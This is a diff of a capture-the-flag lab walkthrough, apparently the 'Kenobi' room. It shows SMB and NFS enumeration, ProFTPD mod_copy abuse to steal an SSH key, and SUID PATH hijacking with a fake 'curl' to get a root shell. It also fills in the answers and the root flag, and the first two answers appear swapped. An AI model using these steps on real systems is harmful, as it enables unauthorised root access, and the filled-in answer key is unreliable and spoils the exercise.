@@ -64,13 +64,15 @@ d0b0f3f53b6caa532a83915e19224899
 # <div align="center">Task 4. Privilege Escalation with Path Variable Manipulation</div>
 ### What file looks particularly out of the ordinary? 
 ```
+3
 ```
 ### Run the binary, how many options appear?
 ```
+/usr/bin/menu
 ```
 ### What is the root flag (/root/root.txt)?
 ```
-
+177b3cd8562289f37382721c28381f02
 ```
 # Let start Scanning The Network
 
@@ -96,7 +98,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
 ```
 * #### Total 7 ports are open. 
 
-#### As Smb is open let enumerate it using nmap,```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.100.244```
+#### As Smb is open let enumerate it using nmap,```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP```
 ```
 └─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.101.17
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:21 IST
@@ -136,7 +138,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 31.42 seconds
 ```
-* #### We have 3 share r listed here , let try to connect with anonymous share.
+* #### We have 3 share r listed here, let try to connect with anonymous share.
 ```
 └─$ smbclient //10.10.101.17/anonymous
 Password for [WORKGROUP\death]:
@@ -148,7 +150,7 @@ smb: \> ls
 
 		9204224 blocks of size 1024. 6877088 blocks available
 ```
-* #### Here is a log.tx , let download this to our system.
+* #### Here is a log.t, let download this to our system.
 ```
 smb: \> get log.txt
 getting file \log.txt of size 12237 as log.txt (16.8 KiloBytes/sec) (average 16.8 KiloBytes/sec)
@@ -192,7 +194,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds
 ```
 #### We can see a var mount here
 
-### According to provided info, Let try banner grabbuing to get ftp version.
+### According to provided info, Let try banner grabbing to get ftp version.
 ```
 └─$ nc 10.10.101.17 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.17]
@@ -232,7 +234,7 @@ SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
 
-### We knew that the /var directory was a mount,Lets mount the /var/tmp directory to our machine.
+### We knew that the /var directory was a mount, Lets mount the /var/tmp directory to our machine.
 ```
 mkdir /mnt/kenobiNFS
 ```
@@ -343,10 +345,24 @@ export PATH=/tmp:$PATH
 /usr/bin/menu
 ```
 ```
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# 
 ```
 
 ## Root Flag
 ```
+# cat /root/root.txt
+177b3cd8562289f37382721c28381f02
 ```
 
 Done !!🙂
